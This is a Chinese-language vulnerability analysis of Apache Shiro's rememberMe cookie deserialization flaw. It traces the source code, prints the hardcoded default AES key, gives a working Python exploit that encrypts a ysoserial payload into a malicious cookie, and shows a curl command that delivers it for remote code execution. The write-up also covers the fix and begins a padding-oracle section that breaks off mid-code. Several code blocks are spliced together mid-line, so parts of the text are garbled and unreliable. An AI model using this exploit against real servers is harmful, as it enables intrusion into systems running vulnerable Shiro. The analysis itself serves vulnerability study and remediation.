    public PrincipalCollection getRememberedPrincipals(SubjectContext subjectContext) {
        PrincipalCollection principals = null;
        try {
            byte[] bytes = getRememberedSerializedIdentity(subjectContext);
            //SHIRO-138 - only call convertBytesToPrincipals if bytes exist:
            if (bytes != null && bytes.length > 0) {
                principals = convertBytesToPrincipals(bytes, subjectContext);
            }
        } catch (RuntimeException re) {
            principals = onRememberedPrincipalFailure(re, subjectContext);
        }
        return principals;
    }
其中，主要就是两个点
  1. 从cookie中读取rememberMe值，通过base64解码后再进行AES解密，得到其解密后的字节数据bytes
  2. 把解密后的字节数据bytes反序列化为PrincipalCollection对象
那么，聪明的人就会发现，如果我们可以控制解密后的明文，我们就可以实现反序列化RCE了
### 0x02 反序列化远古洞（Shiro  0) {
                principals = convertBytesToPrincipals(bytes, subjectContext);
            }
        } catch (RuntimeException re) {
            principals = onRememberedPrincipalFailure(re, subjectContext);
        }
        return principals;
    }
而getRememberedSerializedIdentity()抽象方法由其子类CookieRememberMeManager实现
    protected byte[] getRememberedSerializedIdentity(SubjectContext subjectContext) {
        //...
        String base64 = getCookie().readValue(request, response);
        // Browsers do not always remove cookies immediately (SHIRO-183)
        // ignore cookies that are scheduled for removal
        if (Cookie.DELETED_COOKIE_VALUE.equals(base64)) return null;
        if (base64 != null) {
            base64 = ensurePadding(base64);
            if (log.isTraceEnabled()) {
                log.trace("Acquired Base64 encoded identity [" + base64 + "]");
            }
            byte[] decoded = Base64.decode(base64);
            if (log.isTraceEnabled()) {
                log.trace("Base64 decoded byte array length: " + (decoded != null ? decoded.length : 0) + " bytes.");
            }
            return decoded;
        } else {
            //no cookie set - new site visitor?
            return null;
        }
    }
通过调用SimpleCookie的readValue()方法读取了一个base64的cookie值
    public static final String DEFAULT_REMEMBER_ME_COOKIE_NAME = "rememberMe";
    private Cookie cookie;
    /**
     * Constructs a new {@code CookieRememberMeManager} with a default {@code rememberMe} cookie template.
     */
    public CookieRememberMeManager() {
        Cookie cookie = new SimpleCookie(DEFAULT_REMEMBER_ME_COOKIE_NAME);
        cookie.setHttpOnly(true);
        //One year should be long enough - most sites won't object to requiring a user to log in if they haven't visited
        //in a year:
        cookie.setMaxAge(Cookie.ONE_YEAR);
        this.cookie = cookie;
    }
通过审阅CookieRememberMeManager源码可以发现，该cookie名为rememberMe
    private String ensurePadding(String base64) {
        int length = base64.length();
        if (length % 4 != 0) {
            StringBuilder sb = new StringBuilder(base64);
            for (int i = 0; i  0) {
                principals = convertBytesToPrincipals(bytes, subjectContext);
            }
        } catch (RuntimeException re) {
            principals = onRememberedPrincipalFailure(re, subjectContext);
        }
        return principals;
    }
接着是对base64解码后的数据执行convertBytesToPrincipals()方法，看名称，其实表达了很清晰的含义了，就是把字节数据转换为凭证
    protected PrincipalCollection convertBytesToPrincipals(byte[] bytes, SubjectContext subjectContext) {
        if (getCipherService() != null) {
            bytes = decrypt(bytes);
        }
        return deserialize(bytes);
    }
其中decrypt()方法就是对其进行ASE解密，然后由deserialize()方法对其解密数据进行反序列化
    protected byte[] decrypt(byte[] encrypted) {
        byte[] serialized = encrypted;
        CipherService cipherService = getCipherService();
        if (cipherService != null) {
            ByteSource byteSource = cipherService.decrypt(encrypted, getDecryptionCipherKey());
            serialized = byteSource.getBytes();
        }
        return serialized;
    }
这里有一个很关键的地方，也是这个远古漏洞造成的原因，就是getDecryptionCipherKey()方法
    public byte[] getDecryptionCipherKey() {
        return decryptionCipherKey;
    }
它返回了一个AES解密的key，通过跟踪其设置的代码，可以跟到
    public void setCipherKey(byte[] cipherKey) {
        //Since this method should only be used in symmetric ciphers
        //(where the enc and dec keys are the same), set it on both:
        setEncryptionCipherKey(cipherKey);
        setDecryptionCipherKey(cipherKey);
    }
    private static final byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode("kPH+bIxk5D2deZiIxcaaaA==");
    public AbstractRememberMeManager() {
        this.serializer = new DefaultSerializer();
        this.cipherService = new AesCipherService();
        setCipherKey(DEFAULT_CIPHER_KEY_BYTES);
    }
没错，这个AES解密的key在默认情况下，是一个预置的值，那么到这里，这个漏洞的成因以及完全剖析结束了，那么，我们试试效果？
这是我测试的exploits：
    import sys
    import base64
    import uuid
    from random import Random
    import subprocess
    from Crypto.Cipher import AES
    def encode_rememberme(payload,command):
        popen = subprocess.Popen(['java', '-jar', '../ysoserial/ysoserial-0.0.6-SNAPSHOT-all.jar', payload, command], stdout=subprocess.PIPE)
        BS   = AES.block_size
        pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
        key = "kPH+bIxk5D2deZiIxcaaaA=="
        mode =  AES.MODE_CBC
        #iv   =  base64.b64decode(rememberMe)[:16]   
        iv = uuid.uuid4().bytes
        print(iv)
        encryptor = AES.new(base64.b64decode(key), mode, iv)
        file_body = pad(popen.stdout.read())
        base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
        return base64_ciphertext
    if __name__ == '__main__':
        print(sys.argv[1],sys.argv[2])
        payload = encode_rememberme(sys.argv[1],sys.argv[2])
        with open("payload.cookie", "w") as fpw:
            print("rememberMe={}".format(payload.decode()), file=fpw)
    ~
通过这个exp，就能生成攻击的cookie，最后使用这个cookie，就能达到RCE
    curl -d "" "http://A.B.C.D:8080/login" --cookie "`cat payload.cookie`"
漏洞的修复：
在爆出这样的一个漏洞后，shiro官方的修复手段也很简单，就是让shiro每次启动，都会随机生成一个新的key作为AES解密的key，从而修复这个远古洞。
    public AbstractRememberMeManager() {
        this.serializer = new DefaultSerializer();
        AesCipherService cipherService = new AesCipherService();
        this.cipherService = cipherService;
        setCipherKey(cipherService.generateNewKey().getEncoded());
    }
### 0x03 PaddingOracle CBC Attack（shiro  0) {
                principals = convertBytesToPrincipals(bytes, subjectContext);
            }
        } catch (RuntimeException re) {
            principals = onRememberedPrincipalFailure(re, subjectContext);
        }
        return principals;
    }
我这里列出一条执行方法栈
    protected PrincipalCollection convertBytesToPrincipals(byte[] bytes, SubjectContext subjectContext) {
        if (getCipherService() != null) {
            bytes = decrypt(bytes);
        }
        return deserialize(bytes);
    }
->
    protected byte[] decrypt(byte[] encrypted) {
        byte[] serialized = encrypted;
        CipherService cipherService = getCipherService();
        if (cipherService != null) {
            ByteSource byteSource = cipherService.decrypt(encrypted, getDecryptionCipherKey());
            serialized = byteSource.getBytes();
        }
        return serialized;
    }
->
    public ByteSource decrypt(byte[] ciphertext, byte[] key) throws CryptoException {
        byte[] encrypted = ciphertext;
        //No IV, check if we need to read the IV from the stream:
        byte[] iv = null;
        if (isGenerateInitializationVectors(false)) {
            try {
                //We are generating IVs, so the ciphertext argument array is not actually 100% cipher text.  Instead, it
                //is:
                // - the first N bytes is the initialization vector, where N equals the value of the
                // 'initializationVectorSize' attribute.
                // - the remaining bytes in the method argument (arg.length - N) is the real cipher text.
                //So we need to chunk the method argument into its constituent parts to find the IV and then use
                //the IV to decrypt the real ciphertext:
                int ivSize = getInitializationVectorSize();